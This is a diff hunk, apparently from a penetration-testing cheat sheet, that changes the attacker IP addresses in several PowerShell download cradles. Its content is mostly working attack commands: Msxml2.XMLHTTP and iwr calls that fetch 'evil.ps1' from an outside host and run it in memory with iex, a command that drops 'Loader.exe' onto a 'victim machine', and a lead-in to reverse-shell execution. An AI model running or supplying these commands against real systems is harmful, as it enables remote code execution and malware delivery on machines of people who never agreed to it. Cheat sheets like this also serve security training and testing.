@@ -54,7 +54,7 @@ $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 
 
-$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.100.27/evil.ps1',$false);$h.send();iex $h.responseText
 ```
 
 PowerShell v3+
@@ -62,9 +62,9 @@ PowerShell v3+
 ```powershell
 # UseBasicParsing is important sometime
 # To save inside the victim machine
-iwr http://172.16.100.83/Loader.exe -UseBasicParsing - -OutFile Loadder.exe
+iwr http://172.16.100.27/Loader.exe -UseBasicParsing - -OutFile Loadder.exe
 # Directly execute in memory
-iex (iwr 'http://192.168.230.1/evil.ps1' -UseBasicParsing)
+iex (iwr 'http://192.168.100.27/evil.ps1' -UseBasicParsing)
 ```
 
 Reverse Shell Execution by transferring file. Same can be used for bind shell too by changing **-Reverse** to **-Bind**. Power here is the function name to call and can be modified.
